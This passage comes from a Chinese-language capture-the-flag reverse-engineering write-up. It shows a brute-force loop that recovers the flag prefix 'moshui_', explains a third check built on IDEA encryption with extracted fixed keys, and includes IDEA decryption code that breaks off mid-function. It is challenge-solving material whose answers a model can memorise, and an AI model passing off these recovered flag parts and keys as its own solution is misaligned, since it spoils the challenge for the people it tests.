      <span class="token number">0x5D681B02</span><span class="token punctuation">,</span> <span class="token number">0x9DD277AE</span><span class="token punctuation">,</span> <span class="token number">0xBDBDF21D</span><span class="token punctuation">,</span> <span class="token number">0x7D079EB1</span><span class="token punctuation">,</span> <span class="token number">0xE7B82D06</span><span class="token punctuation">,</span> <span class="token number">0x270241AA</span><span class="token punctuation">,</span> <span class="token number">0x09B64C2B</span><span class="token punctuation">,</span> <span class="token number">0xC90C2087</span><span class="token punctuation">,</span>
      <span class="token number">0x53B39330</span><span class="token punctuation">,</span> <span class="token number">0x9309FF9C</span><span class="token punctuation">,</span> <span class="token number">0x0EDB8832</span><span class="token punctuation">,</span> <span class="token number">0xCE61E49E</span><span class="token punctuation">,</span> <span class="token number">0x54DE5729</span><span class="token punctuation">,</span> <span class="token number">0x94643B85</span><span class="token punctuation">,</span> <span class="token number">0xBAD03604</span><span class="token punctuation">,</span> <span class="token number">0x7A6A5AA8</span><span class="token punctuation">,</span>
      <span class="token number">0xE0D5E91F</span><span class="token punctuation">,</span> <span class="token number">0x206F85B3</span><span class="token punctuation">,</span> <span class="token number">0xA00AE279</span><span class="token punctuation">,</span> <span class="token number">0x60B08ED5</span><span class="token punctuation">,</span> <span class="token number">0xFA0F3D62</span><span class="token punctuation">,</span> <span class="token number">0x3AB551CE</span><span class="token punctuation">,</span> <span class="token number">0x14015C4F</span><span class="token punctuation">,</span> <span class="token number">0xD4BB30E3</span><span class="token punctuation">,</span>
      <span class="token number">0x4E048354</span><span class="token punctuation">,</span> <span class="token number">0x8EBEEFF8</span><span class="token punctuation">,</span> <span class="token number">0x136C9856</span><span class="token punctuation">,</span> <span class="token number">0xD3D6F4FA</span><span class="token punctuation">,</span> <span class="token number">0x4969474D</span><span class="token punctuation">,</span> <span class="token number">0x89D32BE1</span><span class="token punctuation">,</span> <span class="token number">0xA7672660</span><span class="token punctuation">,</span> <span class="token number">0x67DD4ACC</span><span class="token punctuation">,</span>
      <span class="token number">0xFD62F97B</span><span class="token punctuation">,</span> <span class="token number">0x3DD895D7</span><span class="token punctuation">,</span> <span class="token number">0x1DB71064</span><span class="token punctuation">,</span> <span class="token number">0xDD0D7CC8</span><span class="token punctuation">,</span> <span class="token number">0x47B2CF7F</span><span class="token punctuation">,</span> <span class="token number">0x8708A3D3</span><span class="token punctuation">,</span> <span class="token number">0xA9BCAE52</span><span class="token punctuation">,</span> <span class="token number">0x6906C2FE</span><span class="token punctuation">,</span>
      <span class="token number">0xF3B97149</span><span class="token punctuation">,</span> <span class="token number">0x33031DE5</span><span class="token punctuation">,</span> <span class="token number">0xAED16A4B</span><span class="token punctuation">,</span> <span class="token number">0x6E6B06E7</span><span class="token punctuation">,</span> <span class="token number">0xF4D4B550</span><span class="token punctuation">,</span> <span class="token number">0x346ED9FC</span><span class="token punctuation">,</span> <span class="token number">0x1ADAD47D</span><span class="token punctuation">,</span> <span class="token number">0xDA60B8D1</span><span class="token punctuation">,</span>
      <span class="token number">0x40DF0B66</span><span class="token punctuation">,</span> <span class="token number">0x806567CA</span><span class="token punctuation">,</span> <span class="token number">0x9B64C2B1</span><span class="token punctuation">,</span> <span class="token number">0x5BDEAE1D</span><span class="token punctuation">,</span> <span class="token number">0xC1611DAA</span><span class="token punctuation">,</span> <span class="token number">0x01DB7106</span><span class="token punctuation">,</span> <span class="token number">0x2F6F7C87</span><span class="token punctuation">,</span> <span class="token number">0xEFD5102B</span><span class="token punctuation">,</span>
      <span class="token number">0x756AA39C</span><span class="token punctuation">,</span> <span class="token number">0xB5D0CF30</span><span class="token punctuation">,</span> <span class="token number">0x2802B89E</span><span class="token punctuation">,</span> <span class="token number">0xE8B8D432</span><span class="token punctuation">,</span> <span class="token number">0x72076785</span><span class="token punctuation">,</span> <span class="token number">0xB2BD0B29</span><span class="token punctuation">,</span> <span class="token number">0x9C0906A8</span><span class="token punctuation">,</span> <span class="token number">0x5CB36A04</span><span class="token punctuation">,</span>
      <span class="token number">0xC60CD9B3</span><span class="token punctuation">,</span> <span class="token number">0x06B6B51F</span><span class="token punctuation">,</span> <span class="token number">0x26D930AC</span><span class="token punctuation">,</span> <span class="token number">0xE6635C00</span><span class="token punctuation">,</span> <span class="token number">0x7CDCEFB7</span><span class="token punctuation">,</span> <span class="token number">0xBC66831B</span><span class="token punctuation">,</span> <span class="token number">0x92D28E9A</span><span class="token punctuation">,</span> <span class="token number">0x5268E236</span><span class="token punctuation">,</span>
      <span class="token number">0xC8D75181</span><span class="token punctuation">,</span> <span class="token number">0x086D3D2D</span><span class="token punctuation">,</span> <span class="token number">0x95BF4A83</span><span class="token punctuation">,</span> <span class="token number">0x5505262F</span><span class="token punctuation">,</span> <span class="token number">0xCFBA9598</span><span class="token punctuation">,</span> <span class="token number">0x0F00F934</span><span class="token punctuation">,</span> <span class="token number">0x21B4F4B5</span><span class="token punctuation">,</span> <span class="token number">0xE10E9819</span><span class="token punctuation">,</span>
      <span class="token number">0x7BB12BAE</span><span class="token punctuation">,</span> <span class="token number">0xBB0B4702</span><span class="token punctuation">,</span> <span class="token number">0x3B6E20C8</span><span class="token punctuation">,</span> <span class="token number">0xFBD44C64</span><span class="token punctuation">,</span> <span class="token number">0x616BFFD3</span><span class="token punctuation">,</span> <span class="token number">0xA1D1937F</span><span class="token punctuation">,</span> <span class="token number">0x8F659EFE</span><span class="token punctuation">,</span> <span class="token number">0x4FDFF252</span><span class="token punctuation">,</span>
      <span class="token number">0xD56041E5</span><span class="token punctuation">,</span> <span class="token number">0x15DA2D49</span><span class="token punctuation">,</span> <span class="token number">0x88085AE7</span><span class="token punctuation">,</span> <span class="token number">0x48B2364B</span><span class="token punctuation">,</span> <span class="token number">0xD20D85FC</span><span class="token punctuation">,</span> <span class="token number">0x12B7E950</span><span class="token punctuation">,</span> <span class="token number">0x3C03E4D1</span><span class="token punctuation">,</span> <span class="token number">0xFCB9887D</span><span class="token punctuation">,</span>
      <span class="token number">0x66063BCA</span><span class="token punctuation">,</span> <span class="token number">0xA6BC5766</span><span class="token punctuation">,</span> <span class="token number">0x86D3D2D5</span><span class="token punctuation">,</span> <span class="token number">0x4669BE79</span><span class="token punctuation">,</span> <span class="token number">0xDCD60DCE</span><span class="token punctuation">,</span> <span class="token number">0x1C6C6162</span><span class="token punctuation">,</span> <span class="token number">0x32D86CE3</span><span class="token punctuation">,</span> <span class="token number">0xF262004F</span><span class="token punctuation">,</span>
      <span class="token number">0x68DDB3F8</span><span class="token punctuation">,</span> <span class="token number">0xA867DF54</span><span class="token punctuation">,</span> <span class="token number">0x35B5A8FA</span><span class="token punctuation">,</span> <span class="token number">0xF50FC456</span><span class="token punctuation">,</span> <span class="token number">0x6FB077E1</span><span class="token punctuation">,</span> <span class="token number">0xAF0A1B4D</span><span class="token punctuation">,</span> <span class="token number">0x81BE16CC</span><span class="token punctuation">,</span> <span class="token number">0x41047A60</span><span class="token punctuation">,</span>
      <span class="token number">0xDBBBC9D7</span><span class="token punctuation">,</span> <span class="token number">0x1B01A57B</span><span class="token punctuation">,</span> <span class="token number">0xEDB88321</span><span class="token punctuation">,</span> <span class="token number">0x2D02EF8D</span><span class="token punctuation">,</span> <span class="token number">0xB7BD5C3A</span><span class="token punctuation">,</span> <span class="token number">0x77073096</span><span class="token punctuation">,</span> <span class="token number">0x59B33D17</span><span class="token punctuation">,</span> <span class="token number">0x990951BB</span><span class="token punctuation">,</span>
      <span class="token number">0x03B6E20C</span><span class="token punctuation">,</span> <span class="token number">0xC30C8EA0</span><span class="token punctuation">,</span> <span class="token number">0x5EDEF90E</span><span class="token punctuation">,</span> <span class="token number">0x9E6495A2</span><span class="token punctuation">,</span> <span class="token number">0x04DB2615</span><span class="token punctuation">,</span> <span class="token number">0xC4614AB9</span><span class="token punctuation">,</span> <span class="token number">0xEAD54738</span><span class="token punctuation">,</span> <span class="token number">0x2A6F2B94</span><span class="token punctuation">,</span>
      <span class="token number">0xB0D09823</span><span class="token punctuation">,</span> <span class="token number">0x706AF48F</span><span class="token punctuation">,</span> <span class="token number">0x5005713C</span><span class="token punctuation">,</span> <span class="token number">0x90BF1D90</span><span class="token punctuation">,</span> <span class="token number">0x0A00AE27</span><span class="token punctuation">,</span> <span class="token number">0xCABAC28B</span><span class="token punctuation">,</span> <span class="token number">0xE40ECF0A</span><span class="token punctuation">,</span> <span class="token number">0x24B4A3A6</span><span class="token punctuation">,</span>
      <span class="token number">0xBE0B1011</span><span class="token punctuation">,</span> <span class="token number">0x7EB17CBD</span><span class="token punctuation">,</span> <span class="token number">0xE3630B13</span><span class="token punctuation">,</span> <span class="token number">0x23D967BF</span><span class="token punctuation">,</span> <span class="token number">0xB966D408</span><span class="token punctuation">,</span> <span class="token number">0x79DCB8A4</span><span class="token punctuation">,</span> <span class="token number">0x5768B525</span><span class="token punctuation">,</span> <span class="token number">0x97D2D989</span><span class="token punctuation">,</span>
      <span class="token number">0x0D6D6A3E</span><span class="token punctuation">,</span> <span class="token number">0xCDD70692</span><span class="token punctuation">,</span> <span class="token number">0x4DB26158</span><span class="token punctuation">,</span> <span class="token number">0x8D080DF4</span><span class="token punctuation">,</span> <span class="token number">0x17B7BE43</span><span class="token punctuation">,</span> <span class="token number">0xD70DD2EF</span><span class="token punctuation">,</span> <span class="token number">0xF9B9DF6E</span><span class="token punctuation">,</span> <span class="token number">0x3903B3C2</span><span class="token punctuation">,</span>
      <span class="token number">0xA3BC0075</span><span class="token punctuation">,</span> <span class="token number">0x63066CD9</span><span class="token punctuation">,</span> <span class="token number">0xFED41B77</span><span class="token punctuation">,</span> <span class="token number">0x3E6E77DB</span><span class="token punctuation">,</span> <span class="token number">0xA4D1C46C</span><span class="token punctuation">,</span> <span class="token number">0x646BA8C0</span><span class="token punctuation">,</span> <span class="token number">0x4ADFA541</span><span class="token punctuation">,</span> <span class="token number">0x8A65C9ED</span><span class="token punctuation">,</span>
      <span class="token number">0x10DA7A5A</span><span class="token punctuation">,</span> <span class="token number">0xD06016F6</span><span class="token punctuation">,</span> <span class="token number">0xF00F9345</span><span class="token punctuation">,</span> <span class="token number">0x30B5FFE9</span><span class="token punctuation">,</span> <span class="token number">0xAA0A4C5E</span><span class="token punctuation">,</span> <span class="token number">0x6AB020F2</span><span class="token punctuation">,</span> <span class="token number">0x44042D73</span><span class="token punctuation">,</span> <span class="token number">0x84BE41DF</span><span class="token punctuation">,</span>
      <span class="token number">0x1E01F268</span><span class="token punctuation">,</span> <span class="token number">0xDEBB9EC4</span><span class="token punctuation">,</span> <span class="token number">0x4369E96A</span><span class="token punctuation">,</span> <span class="token number">0x83D385C6</span><span class="token punctuation">,</span> <span class="token number">0x196C3671</span><span class="token punctuation">,</span> <span class="token number">0xD9D65ADD</span><span class="token punctuation">,</span> <span class="token number">0xF762575C</span><span class="token punctuation">,</span> <span class="token number">0x37D83BF0</span><span class="token punctuation">,</span>
      <span class="token number">0xAD678847</span><span class="token punctuation">,</span> <span class="token number">0x6DDDE4EB</span><span class="token punctuation">,</span> <span class="token number">0x76DC4190</span><span class="token punctuation">,</span> <span class="token number">0xB6662D3C</span><span class="token punctuation">,</span> <span class="token number">0x2CD99E8B</span><span class="token punctuation">,</span> <span class="token number">0xEC63F227</span><span class="token punctuation">,</span> <span class="token number">0xC2D7FFA6</span><span class="token punctuation">,</span> <span class="token number">0x026D930A</span><span class="token punctuation">,</span>
      <span class="token number">0x98D220BD</span><span class="token punctuation">,</span> <span class="token number">0x58684C11</span><span class="token punctuation">,</span> <span class="token number">0xC5BA3BBF</span><span class="token punctuation">,</span> <span class="token number">0x05005713</span><span class="token punctuation">,</span> <span class="token number">0x9FBFE4A4</span><span class="token punctuation">,</span> <span class="token number">0x5F058808</span><span class="token punctuation">,</span> <span class="token number">0x71B18589</span><span class="token punctuation">,</span> <span class="token number">0xB10BE925</span><span class="token punctuation">,</span>
      <span class="token number">0x2BB45A92</span><span class="token punctuation">,</span> <span class="token number">0xEB0E363E</span><span class="token punctuation">,</span> <span class="token number">0xCB61B38D</span><span class="token punctuation">,</span> <span class="token number">0x0BDBDF21</span><span class="token punctuation">,</span> <span class="token number">0x91646C96</span><span class="token punctuation">,</span> <span class="token number">0x51DE003A</span><span class="token punctuation">,</span> <span class="token number">0x7F6A0DBB</span><span class="token punctuation">,</span> <span class="token number">0xBFD06117</span><span class="token punctuation">,</span>
      <span class="token number">0x256FD2A0</span><span class="token punctuation">,</span> <span class="token number">0xE5D5BE0C</span><span class="token punctuation">,</span> <span class="token number">0x7807C9A2</span><span class="token punctuation">,</span> <span class="token number">0xB8BDA50E</span><span class="token punctuation">,</span> <span class="token number">0x220216B9</span><span class="token punctuation">,</span> <span class="token number">0xE2B87A15</span><span class="token punctuation">,</span> <span class="token number">0xCC0C7794</span><span class="token punctuation">,</span> <span class="token number">0x0CB61B38</span><span class="token punctuation">,</span>
      <span class="token number">0x9609A88F</span><span class="token punctuation">,</span> <span class="token number">0x56B3C423</span><span class="token punctuation">,</span> <span class="token number">0xD6D6A3E9</span><span class="token punctuation">,</span> <span class="token number">0x166CCF45</span><span class="token punctuation">,</span> <span class="token number">0x8CD37CF2</span><span class="token punctuation">,</span> <span class="token number">0x4C69105E</span><span class="token punctuation">,</span> <span class="token number">0x62DD1DDF</span><span class="token punctuation">,</span> <span class="token number">0xA2677173</span><span class="token punctuation">,</span>
      <span class="token number">0x38D8C2C4</span><span class="token punctuation">,</span> <span class="token number">0xF862AE68</span><span class="token punctuation">,</span> <span class="token number">0x65B0D9C6</span><span class="token punctuation">,</span> <span class="token number">0xA50AB56A</span><span class="token punctuation">,</span> <span class="token number">0x3FB506DD</span><span class="token punctuation">,</span> <span class="token number">0xFF0F6A71</span><span class="token punctuation">,</span> <span class="token number">0xD1BB67F0</span><span class="token punctuation">,</span> <span class="token number">0x11010B5C</span><span class="token punctuation">,</span>
      <span class="token number">0x8BBEB8EB</span><span class="token punctuation">,</span> <span class="token number">0x4B04D447</span><span class="token punctuation">,</span> <span class="token number">0x6B6B51F4</span><span class="token punctuation">,</span> <span class="token number">0xABD13D58</span><span class="token punctuation">,</span> <span class="token number">0x316E8EEF</span><span class="token punctuation">,</span> <span class="token number">0xF1D4E243</span><span class="token punctuation">,</span> <span class="token number">0xDF60EFC2</span><span class="token punctuation">,</span> <span class="token number">0x1FDA836E</span><span class="token punctuation">,</span>
      <span class="token number">0x856530D9</span><span class="token punctuation">,</span> <span class="token number">0x45DF5C75</span><span class="token punctuation">,</span> <span class="token number">0xD80D2BDB</span><span class="token punctuation">,</span> <span class="token number">0x18B74777</span><span class="token punctuation">,</span> <span class="token number">0x8208F4C0</span><span class="token punctuation">,</span> <span class="token number">0x42B2986C</span><span class="token punctuation">,</span> <span class="token number">0x6C0695ED</span><span class="token punctuation">,</span> <span class="token number">0xACBCF941</span><span class="token punctuation">,</span>
      <span class="token number">0x36034AF6</span><span class="token punctuation">,</span> <span class="token number">0xF6B9265A</span><span class="token punctuation">,</span> <span class="token number">0xCCCCCCCC</span><span class="token punctuation">,</span> <span class="token number">0xCCCCCC00</span><span class="token punctuation">,</span> <span class="token number">0x00000100</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0xF6B9265A</span><span class="token punctuation">,</span> <span class="token number">0xCCCCCCCC</span><span class="token punctuation">,</span>
      <span class="token number">0x00000008</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

  <span class="token keyword">uint32_t</span> enc1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
      <span class="token number">0x46A95BAD</span><span class="token punctuation">,</span>
      <span class="token number">0x1CAC84B6</span><span class="token punctuation">,</span>
      <span class="token number">0xA67CB2B2</span><span class="token punctuation">,</span>
      <span class="token number">0x32188937</span><span class="token punctuation">,</span>
      <span class="token number">0x4872D39F</span><span class="token punctuation">,</span>
      <span class="token number">0xF2A2E59B</span><span class="token punctuation">,</span>
      <span class="token number">0x011B94D2</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

  <span class="token comment">// 爆破前7字节</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">7</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">28</span><span class="token punctuation">;</span> c <span class="token operator">&lt;</span> <span class="token number">132</span><span class="token punctuation">;</span> c<span class="token operator">++</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>box1<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">uint8_t</span><span class="token punctuation">)</span>c <span class="token operator">^</span> <span class="token number">0x79</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0xB0E0E879</span><span class="token punctuation">)</span> <span class="token operator">==</span> enc1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
          <span class="token punctuation">&#123;</span>
              <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token keyword">break</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span></code></pre>

<p>得到前七个字符为：<strong>moshui_</strong></p>
<p>第三次Check是在case 0处，程序起始的时候启了一个线程，死循环然后这边判断前两次Check是否成功，然后进入最后一次Check代码。</p>
<p><img src="/images/57-1744626745339-63.png" loading="lazy"></p>
<p><img src="/images/58-1744626745339-62.png" loading="lazy"></p>
<p>开始的时候利用前五个字节以及括号内前七个字节生成了两个四字节密钥，然后又赋值了另外两个固定的密钥值。</p>
<p>由于前五字节和括号内前七个字节是已知固定的，所以生成的密钥也是固定，可以直接提取计算完的密钥。</p>
<p>密钥：<strong>0x42B2986C, 0x12345678, 0x0D6D6A3E, 0x89ABCDEF</strong></p>
<p><img src="/images/59-1744626745339-64.png" loading="lazy"></p>
<p>然后下面赋值了密文到v7，判断输入的字符串第29个字符是否为’}’，这边可知flag长度为29，然后利用密钥和输入字符串，进行加密，最后和v7判断。</p>
<p><img src="/images/60-1744626745339-65.png" loading="lazy"></p>
<p>加密是8字节8字节加密，观察sub_7FF7ADAB1640可知是IDEA加密算法，循环加密0x10000次没什么用，因为Input和Output在两个不同数组，所以和加密一次是一样结果。</p>
<p>利用IDEA解密算法配合密钥解密v7的值即可得到后16字节，最后拼接得到完整flag。</p>
<p><img src="/images/61-1744626745339-66.png" loading="lazy"></p>
<p>解密代码：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;bitset></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cmath></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;algorithm></span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

<span class="token keyword">typedef</span> bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> code<span class="token punctuation">;</span>
<span class="token keyword">typedef</span> bitset<span class="token operator">&lt;</span><span class="token number">128</span><span class="token operator">></span> key<span class="token punctuation">;</span>

bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> sub_key<span class="token punctuation">[</span><span class="token number">52</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> inv_sub_key<span class="token punctuation">[</span><span class="token number">52</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

code <span class="token function">XOR</span><span class="token punctuation">(</span>code code_1<span class="token punctuation">,</span> code code_2<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> code_1 <span class="token operator">^</span> code_2<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

code <span class="token function">Plus</span><span class="token punctuation">(</span>code code_1<span class="token punctuation">,</span> code code_2<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        tmp <span class="token operator">+=</span> code_1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span> <span class="token operator">+</span> code_2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    tmp <span class="token operator">%=</span> <span class="token number">65536</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token generic-function"><span class="token function">bitset</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

code <span class="token function">invPlus</span><span class="token punctuation">(</span>code code_in<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
        tmp <span class="token operator">+=</span> code_in<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    tmp <span class="token operator">=</span> <span class="token number">65536</span> <span class="token operator">-</span> tmp<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token generic-function"><span class="token function">bitset</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

code <span class="token function">Times</span><span class="token punctuation">(</span>code code_1<span class="token punctuation">,</span> code code_2<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">long</span> <span class="token keyword">long</span> tmp_1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> tmp_2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        tmp_1 <span class="token operator">+=</span> code_1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
        tmp_2 <span class="token operator">+=</span> code_2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>tmp_1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
        tmp_1 <span class="token operator">=</span> <span class="token number">65536</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>tmp_2 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
        tmp_2 <span class="token operator">=</span> <span class="token number">65536</span><span class="token punctuation">;</span>
    <span class="token keyword">long</span> <span class="token keyword">long</span> tmp <span class="token operator">=</span> <span class="token punctuation">(</span>tmp_1 <span class="token operator">*</span> tmp_2<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">65537</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token generic-function"><span class="token function">bitset</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>tmp <span class="token operator">==</span> <span class="token number">65536</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">Exgcd</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">&amp;</span>x<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">&amp;</span>y<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>b<span class="token punctuation">)</span>
        x <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> y <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
        <span class="token function">Exgcd</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> a <span class="token operator">%</span> b<span class="token punctuation">,</span> y<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">,</span> y <span class="token operator">-=</span> a <span class="token operator">/</span> b <span class="token operator">*</span> x<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

code <span class="token function">invTimes</span><span class="token punctuation">(</span>code code_in<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
        tmp <span class="token operator">+=</span> code_in<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> x<span class="token punctuation">,</span> y<span class="token punctuation">;</span>
    <span class="token keyword">int</span> p <span class="token operator">=</span> <span class="token number">65537</span><span class="token punctuation">;</span>
    <span class="token function">Exgcd</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> p<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>
    x <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">%</span> p <span class="token operator">+</span> p<span class="token punctuation">)</span> <span class="token operator">%</span> p<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token generic-function"><span class="token function">bitset</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">subkeys_get</span><span class="token punctuation">(</span>code keys_input<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    key keys<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>
            keys<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> keys_input<span class="token punctuation">[</span><span class="token number">7</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>

